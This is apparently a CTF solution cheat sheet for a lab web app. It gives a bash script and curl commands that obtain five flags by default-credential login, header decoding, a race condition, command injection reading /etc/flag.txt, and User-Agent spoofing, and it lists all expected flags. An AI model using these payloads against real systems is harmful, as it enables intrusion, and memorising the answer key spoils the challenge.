# CTF 2025 - Quick Reference Cheat Sheet

## 🚀 तुरंत सभी Flags पाने के Commands

### एक साथ सभी flags test करने के लिए:

```bash
#!/bin/bash
echo "🚩 CTF 2025 - All Flags Extraction Script"
echo "==========================================\n"

# Flag 1: Login bypass
echo "🔐 Flag 1 - Authentication Bypass:"
curl -s -X POST -d "username=admin&password=password123" http://192.168.29.153:5000/login | grep -o "TCQ2025{[^}]*}"
echo ""

# Flag 2: Header analysis
echo "🌸 Flag 2 - API Header Analysis:"
curl -s -I http://192.168.29.153:5000/api/flower | grep "X-Flower-Token" | cut -d' ' -f2 | tr -d '\r\n' | base64 -d
echo ""

# Flag 3: Race condition
echo "🏃 Flag 3 - Race Condition:"
for i in {1..6}; do 
    result=$(curl -s http://192.168.29.153:5000/race | jq -r '.flag // empty' 2>/dev/null)
    if [ ! -z "$result" ]; then
        echo $result
        break
    fi
done
echo ""

# Flag 4: Command injection
echo "💻 Flag 4 - Command Injection:"
curl -s "http://192.168.29.153:5000/system?cmd=cat%20/etc/flag.txt" | grep -o "TCQ2025{[^}]*}"
echo ""

# Flag 5: User-Agent spoofing
echo "🔍 Flag 5 - User-Agent Spoofing:"
curl -s -H "User-Agent: CTF-Scanner-2025" http://192.168.29.153:5000/vulnerability | jq -r '.flag'
echo ""

echo "🎉 All flags extracted successfully!"
```

## 📋 Quick Commands Reference

### Flag 1 - Login (admin/password123)
```bash
curl -X POST -d "username=admin&password=password123" http://192.168.29.153:5000/login
```

### Flag 2 - API Headers (base64 decode required)
```bash
curl -I http://192.168.29.153:5000/api/flower | grep X-Flower-Token
```

### Flag 3 - Race Condition (rapid requests)
```bash
for i in {1..6}; do curl -s http://192.168.29.153:5000/race; sleep 0.1; done
```

### Flag 4 - Command Injection (cat /etc/flag.txt)
```bash
curl "http://192.168.29.153:5000/system?cmd=cat%20/etc/flag.txt"
```

### Flag 5 - User-Agent (CTF-Scanner-2025)
```bash
curl -H "User-Agent: CTF-Scanner-2025" http://192.168.29.153:5000/vulnerability
```

## 🌐 All Endpoints Summary

| Endpoint | Method | Purpose | Flag |
|----------|--------|---------|------|
| `/` | GET | Main page | Info |
| `/page` | GET | Challenge page | Hints |
| `/login` | POST | Authentication | Flag 1 |
| `/api/flower` | GET | API with headers | Flag 2 |
| `/race` | GET | Timing challenge | Flag 3 |
| `/system?cmd=` | GET | Command execution | Flag 4 |
| `/vulnerability` | GET | Scanner detection | Flag 5 |
| `/robots.txt` | GET | Reconnaissance | Hints |

## 🎯 Expected Flags Output

```
Flag 1: TCQ2025{S3Cur1ty_Br3@k_P@55ed}
Flag 2: TCQ2025{F!ow3r#92@tY8&Vk}
Flag 3: TCQ2025{Y0u_kn0w_i5_th15_RaC3}
Flag 4: TCQ2025{PwN_2_0wN_N0w_Y0u_ar3_5t3M}
Flag 5: TCQ2025{D4Y_0_T0_zeR0_d4Y}
```

## 🔧 Essential Tools

- **curl** - HTTP requests
- **jq** - JSON parsing
- **base64** - Encoding/decoding
- **grep** - Text filtering
- **Browser DevTools** - Header analysis

Save this as `quick_flags.sh` and run: `chmod +x quick_flags.sh && ./quick_flags.sh`